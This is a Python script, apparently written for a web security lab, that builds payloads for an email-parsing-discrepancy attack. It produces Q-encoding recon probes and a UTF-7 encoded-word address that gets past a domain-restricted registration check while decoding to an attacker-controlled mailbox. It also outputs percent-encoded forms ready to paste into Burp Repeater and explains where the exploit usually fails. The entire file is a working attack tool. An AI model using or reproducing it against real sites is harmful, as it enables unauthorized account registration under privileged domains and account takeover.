#!/usr/bin/env python3
"""
email_parser_bypass.py

Builds ready-to-submit payloads for "email address parsing discrepancy"
bugs — where a domain-restricted registration/email field is validated as
a raw string, but a downstream mail parser decodes MIME encoded-word /
UTF-7 syntax first, letting you smuggle a different actual recipient past
the domain check.

Covers two phases:
  1. Recon probes — Q-encoded (ISO-8859-1 / UTF-8) payloads to test
     whether the app detects and blocks "suspicious" encodings at all.
  2. The actual exploit — a UTF-7 encoded-word payload that decodes to
     your attacker-controlled address while the raw string still ends in
     the privileged/allowed domain.

Every output is ALSO given already percent-encoded for direct pasting into
an application/x-www-form-urlencoded POST body in Burp Repeater — the
payload contains literal '&', '=', '?' and '@' characters that WILL break
form parsing (silently truncating your value at the first raw '&') if
pasted unencoded. This is the single most common way this exploit fails
in practice.

Usage:
    python3 email_parser_bypass.py \\
        --attacker-local attacker \\
        --attacker-domain exploit-XXXXXXXX.exploit-server.net \\
        --target-domain ginandjuice.shop \\
        --probe
"""

import argparse
import base64
import urllib.parse


FORM_SPECIAL_CHARS = {
    "=": "%3D",
    "?": "%3F",
    "&": "%26",
    "@": "%40",
    " ": "%20",
}


def form_encode(value: str) -> str:
    """Percent-encode only the characters that break application/x-www-form-urlencoded
    parsing when pasted raw into a Burp Repeater body. Leaves the rest readable."""
    out = []
    for ch in value:
        out.append(FORM_SPECIAL_CHARS.get(ch, ch))
    return "".join(out)


def utf7_shift_segment(s: str) -> str:
    """UTF-7 shift-encode a short string (e.g. '@' or ' ') into its
    '&<modified-base64>-' form per RFC 2152. Good for individually
    encoding a handful of special characters — not a full general-purpose
    UTF-7 text encoder (doesn't batch multiple chars into one shift run,
    which isn't needed for this attack and keeps the output predictable)."""
    utf16_bytes = s.encode("utf-16-be")
    b64 = base64.b64encode(utf16_bytes).decode().rstrip("=")
    return f"&{b64}-"


def build_q_encoding_probes(target_domain: str, probe_word: str = "abc"):
    """Build the two cheap recon probes from the lab's own methodology:
    Q-encoding in ISO-8859-1 and UTF-8. If these get blocked with a
    distinct 'suspicious encoding' style error (not just 'invalid format'),
    the app has SOME encoding-awareness — worth testing which encodings
    it missed. If these pass through silently, the validator may not even
    attempt decoding at all, which is a different, likely easier bug."""
    hex_bytes = probe_word.encode().hex()
    q_payload = "".join(f"={hex_bytes[i:i+2].upper()}" for i in range(0, len(hex_bytes), 2))

    iso = f"=?iso-8859-1?q?{q_payload}?=foo@{target_domain}"
    utf8 = f"=?utf-8?q?{q_payload}?=foo@{target_domain}"
    return {"iso-8859-1": iso, "utf-8": utf8}


def build_exploit_payload(attacker_local: str, attacker_domain: str, target_domain: str, chars_to_hide=("@", " ")):
    """Build the UTF-7 encoded-word payload: decodes to
    <attacker_local>@<attacker_domain>, while the raw string still ends
    in @<target_domain> to satisfy a literal domain check."""
    at_enc = utf7_shift_segment("@")
    space_enc = utf7_shift_segment(" ")

    inner = f"{attacker_local}{at_enc}{attacker_domain}{space_enc}"
    raw_email = f"=?utf-7?q?{inner}?=@{target_domain}"
    return raw_email


def main():
    parser = argparse.ArgumentParser(description="Build email-parsing-discrepancy bypass payloads.")
    parser.add_argument("--attacker-local", default="attacker", help="Local part of the address you actually control (default: attacker)")
    parser.add_argument("--attacker-domain", required=True, help="Domain/subdomain you actually receive mail at (e.g. your exploit server, or a webhook-based catch-all domain — no Burp Pro/Collaborator required)")
    parser.add_argument("--target-domain", required=True, help="The privileged/allowed domain the app's validator checks for (e.g. ginandjuice.shop)")
    parser.add_argument("--probe", action="store_true", help="Also print the cheap Q-encoding recon probes")
    args = parser.parse_args()

    if args.probe:
        print("=== Recon probes (run these first) ===\n")
        probes = build_q_encoding_probes(args.target_domain)
        for name, payload in probes.items():
            print(f"[{name}]")
            print(f"  Raw:          {payload}")
            print(f"  Form-encoded: {form_encode(payload)}\n")

    print("=== Exploit payload ===\n")
    raw_email = build_exploit_payload(args.attacker_local, args.attacker_domain, args.target_domain)
    print(f"Decodes to:   {args.attacker_local}@{args.attacker_domain}")
    print(f"Raw string:   {raw_email}")
    print(f"Form-encoded (paste this as the email value in a raw x-www-form-urlencoded body):")
    print(form_encode(raw_email))


if __name__ == "__main__":
    main()
